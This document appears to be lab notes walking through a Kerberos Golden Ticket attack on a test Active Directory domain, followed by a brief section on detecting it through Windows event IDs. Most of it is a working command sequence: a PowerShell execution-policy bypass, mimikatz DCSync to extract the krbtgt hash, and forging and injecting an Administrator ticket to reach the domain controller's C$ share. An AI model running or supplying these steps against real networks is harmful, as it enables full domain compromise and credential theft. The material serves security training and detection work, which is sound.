# Golden Ticket

The Kerberos Golden Ticket is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.

When a Domain is created, the unique user account krbtgt is created by default; krbtgt is a disabled account that cannot be deleted, renamed, or enabled. 

The Domain Controller's KDC service will use the password of krbtgt to derive a key with which it signs all Kerberos tickets. 

This password's hash is the most trusted object in the entire Domain because it is how objects guarantee that the environment's Domain issued Kerberos tickets.


## 1. Start PowerShell with the Execution Policy temporarily bypassed. ( in Bob useraccount)

```
PS C:\Users\bob\Downloads> powershell -exec bypass
PS C:\Users\bob\Downloads> . .\PowerView.ps1
PS C:\Users\bob\Downloads> Get-DomainSID
S-1-5-21-1518138621-4282902758-752445584

```
## 2. Run cmd.exe from another domain user (rocky), to extract rocky hash

```
runas.exe /user:eagle\rocky cmd.exe
```

## 3. Use mimikatz.exe to pretend as Domain Controller and extract the krbtgt hash (in Rocky useraccount)

```
.\mimikatz.exe
mimikatz> lsadump::dcsync /domain:eagle.local /dc:DC1.eagle.local /user:krbtgt
```

## 4. Create a ticket for the account Administrator. The /ptt argument makes Mimikatz pass the ticket into the current session:

```
kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```
<img width="1302" height="667" alt="image" src="https://github.com/user-attachments/assets/09bed4b1-c459-4a40-a395-1f6cd0d44628" />

## 5. Veify the new ticket

```
C:\Mimikatz>klist
```
<img width="1082" height="461" alt="image" src="https://github.com/user-attachments/assets/68f815e0-e696-4d4c-8e57-4d713c17112d" />

6. Verify the ticket is working, we can list the content of the C$ share of DC1 using it:
```
C:\Mimikatz>dir \\dc1\c$
```

# Detect with Event Viewer

## Event ID 4624 and 4625 (successful and failed logon).

<img width="777" height="670" alt="image" src="https://github.com/user-attachments/assets/4ccbc882-0f02-401e-a616-b5782c76e5a8" />

## Event ID 4769

<img width="780" height="442" alt="image" src="https://github.com/user-attachments/assets/cee577d6-dd0b-43ba-8ffe-b9d2e342890c" />

